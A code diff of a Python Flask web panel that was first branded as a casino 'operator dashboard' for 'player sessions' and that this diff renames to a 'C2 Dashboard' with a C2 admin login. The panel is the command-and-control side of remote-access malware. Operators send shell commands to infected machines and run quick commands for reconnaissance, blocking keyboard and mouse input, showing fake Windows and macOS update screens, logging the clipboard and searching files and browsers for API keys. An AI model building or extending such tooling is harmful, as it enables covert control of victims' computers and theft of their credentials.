@@ -230,187 +230,186 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-DASHBOARD_HTML = """
+LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Vivid Casino - Operator Dashboard</title>
-    <style>
-        body { font-family: Arial; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
-        h1 { color: #e94560; }
-        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
-        th { background: #16213e; }
-        .online { color: #4ecca3; }
-        .offline { color: #e94560; }
-        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 4px; }
-        .badge-surface { background: #0078d4; color: white; }
-        .badge-tablet { background: #ff6b35; color: white; }
-        .badge-arm { background: #9b59b6; color: white; }
-        .badge-x64 { background: #34495e; color: white; }
-        input, button { padding: 8px; margin: 4px; }
-        button { background: #e94560; color: white; border: none; cursor: pointer; }
-        .log { background: #0f0f23; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); }
-        .modal-content { background: #1a1a2e; margin: 5% auto; padding: 20px; border: 1px solid #333; width: 80%; max-width: 800px; border-radius: 8px; }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
-        .close-btn { color: #e94560; font-size: 28px; font-weight: bold; cursor: pointer; }
-        .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; }
-        .cmd-btn { background: #16213e; border: 1px solid #333; color: #eee; padding: 12px; text-align: left; cursor: pointer; border-radius: 4px; }
-        .cmd-btn:hover { background: #0f3460; }
-        .cmd-btn span { display: block; font-size: 11px; color: #888; margin-top: 4px; }
-        .machine-info { font-size: 12px; color: #aaa; }
-    </style>
-</head>
+<head><title>C2 Login</title><style>
+body{background:#1a1a2e;color:#fff;font-family:Arial;padding:40px;}
+form{max-width:300px;margin:100px auto;padding:30px;background:#16213e;border-radius:10px;}
+input{width:100%;padding:10px;margin:10px 0;border:none;border-radius:5px;box-sizing:border-box;}
+button{width:100%;padding:12px;background:#ffd700;color:#000;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}
+.error{color:#f44336;text-align:center;}
+</style></head>
 <body>
-    <h1>🎰 Vivid Casino - Operator Dashboard</h1>
-    <p>Active Player Sessions: {{ sessions|length }}</p>
+<form method="POST">
+    <h2 style="text-align:center;color:#ffd700;">C2 Admin Login</h2>
+    {% if error %}<p class="error">{{ error }}</p>{% endif %}
+    <input type="text" name="username" placeholder="Username" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Login</button>
+</form>
+</body></html>
+"""
 
-    <table>
-        <tr>
-            <th>Player ID</th>
-            <th>Status</th>
-            <th>System</th>
-            <th>User</th>
-            <th>Last Active</th>
-            <th>Actions</th>
-        </tr>
-        {% for sid, s in sessions.items() %}
-        <tr>
-            <td>{{ sid }}</td>
-            <td class="{{ 'online' if s.online else 'offline' }}">
-                {{ 'Online' if s.online else 'Offline' }}
-            </td>
-            <td>{{ s.system_info.get('system', 'Unknown') }}</td>
-            <td>{{ s.system_info.get('user', 'Unknown') }}</td>
-            <td>{{ '%.0f' % (now - s.last_heartbeat) }}s ago</td>
-            <td>
-                <form id="form-{{ sid }}" method="POST" action="/send_command" style="display:inline">
-                    <input type="hidden" name="player_id" value="{{ sid }}">
-                    <input type="text" name="command" placeholder="Command" size="20">
-                    <button type="submit">Send</button>
-                    <button type="button" onclick="openModal('{{ sid }}', '{{ s.system_info.get('machine_type', 'desktop') }}', '{{ s.system_info.get('arch', 'x64') }}')" style="background:#0f3460;">Quick</button>
-                </form>
-            </td>
-        </tr>
-        {% if s.log %}
-        <tr>
-            <td colspan="6">
-                <div class="log">
-                    {% for entry in s.log[-10:] %}
-                    [{{ entry.timestamp }}] {{ entry.message[:200] }}<br>
-                    {% endfor %}
-                </div>
-            </td>
-        </tr>
-        {% endif %}
-        {% endfor %}
-    </table>
+DASHBOARD_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head><title>C2 Dashboard</title><style>
+body{background:#1a1a2e;color:#fff;font-family:Arial,sans-serif;padding:20px;}
+h1{color:#ffd700;}table{width:100%;border-collapse:collapse;margin-top:20px;}
+th,td{padding:10px;text-align:left;border:1px solid #333;}
+th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
+.online{color:#4CAF50;}.offline{color:#f44336;}
+.cmd-input{width:200px;padding:8px;border:none;border-radius:4px;}
+.btn{padding:8px 16px;background:#ffd700;color:#000;border:none;border-radius:4px;cursor:pointer;margin-left:5px;}
+.btn-del{background:#f44336;color:#fff;}
+.btn-quick{background:#2196F3;color:#fff;}
+.output{background:#0d1b2a;padding:10px;border-radius:4px;margin-top:5px;max-width:800px;white-space:pre-wrap;font-family:monospace;font-size:12px;word-break:break-word;}
+.logout{float:right;color:#f44336;text-decoration:none;}
+.log-table{width:100%;margin-top:10px;}
+.log-table th{background:#0d1b2a;}
+.log-table td{font-family:monospace;font-size:12px;}
+.status-pending{color:#ff9800;}.status-done{color:#4CAF50;}
+.modal{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.7);}
+.modal-content{background:#16213e;margin:10% auto;padding:20px;border-radius:10px;width:500px;max-width:90%;}
+.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;}
+.modal-header h2{color:#ffd700;margin:0;}
+.close-btn{color:#f44336;font-size:28px;font-weight:bold;cursor:pointer;}
+.close-btn:hover{color:#fff;}
+.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;max-height:400px;overflow-y:auto;padding-right:5px;}
+.cmd-btn{padding:12px;background:#1a1a2e;border:1px solid #333;border-radius:6px;color:#fff;cursor:pointer;text-align:left;font-size:13px;transition:background 0.2s;}
+.cmd-btn:hover{background:#2196F3;border-color:#2196F3;}
+.cmd-btn span{display:block;font-size:11px;color:#888;margin-top:2px;}
+</style></head>
+<body>
+<h1>C2 Dashboard <a href="/logout" class="logout">Logout</a></h1>
+<p>Server: {{ host }}:{{ port }} | Clients: {{ count }}</p>
+<table>
+<tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Command</th><th>Action</th></tr>
+{% for cid, c in clients.items() %}
+<tr>
+<td>{{ cid }}</td>
+<td>{{ c.system_info.get('host', 'unknown') }}</td>
+<td>{{ c.system_info.get('user', 'unknown') }}</td>
+<td>{{ c.system_info.get('system', 'unknown') }}</td>
+<td class="{{ 'online' if c.online else 'offline' }}">{{ 'Online' if c.online else 'Offline' }}</td>
+<td>{{ '%.0f'|format(time.time() - c.last_heartbeat) }}s ago</td>
+<td>
+<form method="POST" action="/send_command" style="display:inline;" id="form-{{ cid }}">
+<input type="hidden" name="client_id" value="{{ cid }}">
+<input type="text" name="command" class="cmd-input" placeholder="whoami">
+<button type="submit" class="btn">Send</button>
+<button type="button" class="btn btn-quick" onclick="openModal('{{ cid }}')">Quick</button>
+</form>
+</td>
+<td>
+<form method="POST" action="/delete_client" style="display:inline;">
+<input type="hidden" name="client_id" value="{{ cid }}">
+<button type="submit" class="btn btn-del" onclick="return confirm('Delete?')">Delete</button>
+</form>
+</td>
+</tr>
+{% if c.log %}
+<tr>
+<td colspan="8">
+<table class="log-table">
+<tr><th>Time</th><th>Output</th></tr>
+{% for entry in c.log[-5:] %}
+<tr>
+<td>{{ entry.timestamp }}</td>
+<td class="output">{{ entry.message[:100000] if entry.message else '[waiting...]' }}</td>
+</tr>
+{% endfor %}
+</table>
+</td>
+</tr>
+{% endif %}
+{% endfor %}
+</table>
+<p><a href="/" style="color:#ffd700;">Refresh</a></p>
 
-    <h3>Quick Commands</h3>
-    <form method="POST" action="/broadcast_command">
-        <input type="text" name="command" placeholder="Broadcast command to all players" size="50">
-        <button type="submit">Broadcast</button>
-    </form>
+<!-- Quick Commands Modal -->
+<div id="quickModal" class="modal">
+<div class="modal-content">
+<div class="modal-header">
+<h2>Quick Commands</h2>
+<span class="close-btn" onclick="closeModal()">&times;</span>
+</div>
+<div class="cmd-grid">
+<button class="cmd-btn" onclick="sendCmd('whoami')">whoami <span>Current user</span></button>
+<button class="cmd-btn" onclick="sendCmd('hostname')">hostname <span>Machine name</span></button>
+<button class="cmd-btn" onclick="sendCmd('systeminfo')">systeminfo <span>Full system info</span></button>
+<button class="cmd-btn" onclick="sendCmd('ipconfig /all')">ipconfig /all <span>Network config</span></button>
+<button class="cmd-btn" onclick="sendCmd('netstat -an')">netstat -an <span>Active connections</span></button>
+<button class="cmd-btn" onclick="sendCmd('tasklist')">tasklist <span>Running processes</span></button>
+<button class="cmd-btn" onclick="sendCmd('dir')">dir <span>List files</span></button>
+<button class="cmd-btn" onclick="sendCmd('dir %USERPROFILE%')">dir %USERPROFILE% <span>User home files</span></button>
+<button class="cmd-btn" onclick="sendCmd('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')">Registry Run Keys <span>Startup programs</span></button>
+<button class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
+<button class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
+<button class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
+<button class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
+<button class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
+<button class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
+<button class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
+<button class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
+<button class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
+<button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
+</div>
+</div>
+</div>
 
-    <!-- Quick Commands Modal -->
-    <div id="quickModal" class="modal">
-    <div class="modal-content">
-    <div class="modal-header">
-    <h2>Quick Commands</h2>
-    <span class="close-btn" onclick="closeModal()">&times;</span>
-    </div>
-    <div class="cmd-grid">
-    <button class="cmd-btn" onclick="sendCmd('whoami')">whoami <span>Current user</span></button>
-    <button class="cmd-btn" onclick="sendCmd('hostname')">hostname <span>Machine name</span></button>
-    <button class="cmd-btn" onclick="sendCmd('systeminfo')">systeminfo <span>Full system info</span></button>
-    <button class="cmd-btn" onclick="sendCmd('ipconfig /all')">ipconfig /all <span>Network config</span></button>
-    <button class="cmd-btn" onclick="sendCmd('netstat -an')">netstat -an <span>Active connections</span></button>
-    <button class="cmd-btn" onclick="sendCmd('tasklist')">tasklist <span>Running processes</span></button>
-    <button class="cmd-btn" onclick="sendCmd('dir')">dir <span>List files</span></button>
-    <button class="cmd-btn" onclick="sendCmd('dir %USERPROFILE%')">dir %USERPROFILE% <span>User home files</span></button>
-    <button class="cmd-btn" onclick="sendCmd('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')">Registry Run Keys <span>Startup programs</span></button>
-    <button class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
-    <button class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
-    <button class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
-    <button class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
-    <button class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
-    <button class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
-    <button class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
-    <button class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
-    <button class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
-    <button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
-    </div>
-    </div>
-    </div>
+<script>
+var activeClientId = '';
+var activeMachineType = 'desktop';
+var activeArch = 'x64';
 
-    <script>
-    var activeClientId = '';
-    var activeMachineType = 'desktop';
-    var activeArch = 'x64';
-    
-    function openModal(clientId, machineType, arch) {
-        activeClientId = clientId;
-        activeMachineType = machineType || 'desktop';
-        activeArch = arch || 'x64';
-        
-        /* Adjust API key button text for Surface/ARM */
-        var apiBtn = document.getElementById('btnFindApi');
-        if (activeMachineType.includes('surface') || activeArch.includes('ARM')) {
-            apiBtn.innerHTML = '🔑 Find API Keys <span>Surface/ARM adaptive scan</span>';
-        } else {
-            apiBtn.innerHTML = '🔑 Find API Keys <span>Search files/browsers for keys</span>';
-        }
-        
-        document.getElementById('quickModal').style.display = 'block';
+function openModal(clientId) {
+    activeClientId = clientId;
+    document.getElementById('quickModal').style.display = 'block';
+}
+function closeModal() {
+    document.getElementById('quickModal').style.display = 'none';
+}
+function sendCmd(cmd) {
+    var form = document.getElementById('form-' + activeClientId);
+    form.querySelector('input[name=\"command\"]').value = cmd;
+    form.submit();
+}
+window.onclick = function(event) {
+    var modal = document.getElementById('quickModal');
+    if (event.target == modal) {
+        modal.style.display = 'none';
     }
-    function closeModal() {
-        document.getElementById('quickModal').style.display = 'none';
-    }
-    function sendCmd(cmd) {
-        var form = document.getElementById('form-' + activeClientId);
-        form.querySelector('input[name="command"]').value = cmd;
-        form.submit();
-    }
-    window.onclick = function(event) {
-        var modal = document.getElementById('quickModal');
-        if (event.target == modal) {
-            modal.style.display = 'none';
-        }
-    }
-    </script>
-
-    <p><a href="/logout" style="color:#e94560">Logout</a></p>
-</body>
-</html>
+}
+</script>
+</body></html>
 """
 
 if app:
     @app.route('/')
     @login_required
     def dashboard():
-        now = time.time()
         with session_lock:
-            sessions = dict(active_sessions)
-        return render_template_string(DASHBOARD_HTML, sessions=sessions, now=now)
+            clients = dict(active_sessions)
+        return render_template_string(DASHBOARD_TEMPLATE,
+            clients=clients,
+            host=GAME_HOST,
+            port=GAME_SOCKET_PORT,
+            count=len(clients),
+            time=time)
 
     @app.route('/login', methods=['GET', 'POST'])
     def login():
+        error = None
         if request.method == 'POST':
             if request.form.get('username') == ADMIN_USERNAME and \
                request.form.get('password') == ADMIN_PASSWORD:
                 resp = redirect(url_for('dashboard'))
                 resp.set_cookie('vce_auth', '1')
                 return resp
-            flash('Invalid credentials')
-        return """
-        <form method="POST">
-            <h2>Vivid Casino - Operator Login</h2>
-            <input name="username" placeholder="Username"><br>
-            <input name="password" type="password" placeholder="Password"><br>
-            <button type="submit">Login</button>
-        </form>
-        """
+            error = 'Invalid credentials'
+        return render_template_string(LOGIN_TEMPLATE, error=error)
 
     @app.route('/logout')
     def logout():
@@ -421,7 +420,7 @@ if app:
     @app.route('/send_command', methods=['POST'])
     @login_required
     def send_command():
-        player_id = request.form.get('player_id')
+        player_id = request.form.get('client_id')
         command = request.form.get('command')
         if not player_id or not command:
             return "Missing parameters", 400
@@ -436,7 +435,19 @@ if app:
             time.sleep(3)
             return redirect(url_for('dashboard'))
         else:
-            return "Player not found", 404
+            return "Client not found", 404
+
+    @app.route('/delete_client', methods=['POST'])
+    @login_required
+    def delete_client():
+        player_id = request.form.get('client_id')
+        if not player_id:
+            return "Missing client_id", 400
+        with session_lock:
+            if player_id in active_sessions:
+                active_sessions[player_id].close()
+                active_sessions.pop(player_id, None)
+        return redirect(url_for('dashboard'))
 
     @app.route('/broadcast_command', methods=['POST'])
     @login_required
